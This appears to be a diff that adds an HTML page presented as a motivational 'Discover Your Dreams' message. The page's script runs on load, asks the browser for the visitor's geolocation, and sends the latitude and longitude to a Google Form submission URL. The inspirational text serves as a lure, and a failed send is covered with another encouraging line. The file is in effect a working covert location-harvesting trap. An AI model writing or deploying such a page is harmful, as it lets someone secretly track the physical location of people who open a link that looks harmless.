@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Discover Your Dreams</title>
+    <style>
+      body {
+        font-family: "Times New Roman", serif;
+        background: linear-gradient(135deg, #40afdb 0%, #aeb1b0 100%);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      .container {
+        text-align: center;
+        padding: 20px;
+        background: linear-gradient(135deg, #14a7e0 0%, #aeb1b0 100%);
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        max-width: 600px;
+      }
+
+      h2 {
+        color: #000000;
+        font-size: 2.5em;
+      }
+
+      p {
+        font-size: 1.3em;
+        color: #fffffe;
+        line-height: 1.6;
+      }
+
+      .error {
+        color: #000000;
+        font-weight: bold;
+        font-size: 1.5em;
+      }
+    </style>
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendLocation, showError);
+        } else {
+          alert("❌ Geolocation is not supported by this browser.");
+        }
+      }
+
+      function sendLocation(position) {
+        let latitude = position.coords.latitude;
+        let longitude = position.coords.longitude;
+
+        let googleFormURL =
+          "https://docs.google.com/forms/d/e/1FAIpQLSdDsktX5KnQ_PlM4ZrQesD9R6ZFu4BdfgLVtxf6s0w8GeJRmA/formResponse";
+
+        let formData = new FormData();
+        formData.append("entry.1671689945", latitude);
+        formData.append("entry.1808869258", longitude);
+
+        fetch(googleFormURL, { method: "POST", body: formData })
+          .then((response) => {
+            document.getElementById(
+              "info"
+            ).innerHTML = `✅ Location sent successfully! <br> Latitude: ${latitude} <br> Longitude: ${longitude}`;
+          })
+          .catch((error) => {
+            console.error("Fetch error:", error);
+            document.getElementById("info").innerHTML =
+              '<p class="error">Every small step you take brings you closer to your goal. Keep going, because progress is still progress, no matter how slow!</p>';
+          });
+      }
+
+      function showError(error) {
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            alert("❌ User denied location access.");
+            break;
+          case error.POSITION_UNAVAILABLE:
+            alert("⚠️ Location information is unavailable.");
+            break;
+          case error.TIMEOUT:
+            alert("⏳ Location request timed out.");
+            break;
+        }
+      }
+    </script>
+  </head>
+  <body onload="getLocation()">
+    <div class="container">
+      <h2>🌍 Discover Your Dreams</h2>
+      <p>
+        Dreams are the roadmaps to our true potential. They inspire us to
+        explore, grow, and push beyond our limits. The journey to discovering
+        your dreams begins with belief—believing in yourself, your passion, and
+        your ability to turn aspirations into reality. Embrace challenges as
+        stepping stones, learn from every experience, and never be afraid to
+        take that first step. The future is full of endless possibilities, and
+        the only way to reach them is to start now. Your dreams are waiting—go
+        chase them!
+      </p>
+      <p id="info">loading.., please wait...</p>
+    </div>
+  </body>
+</html>
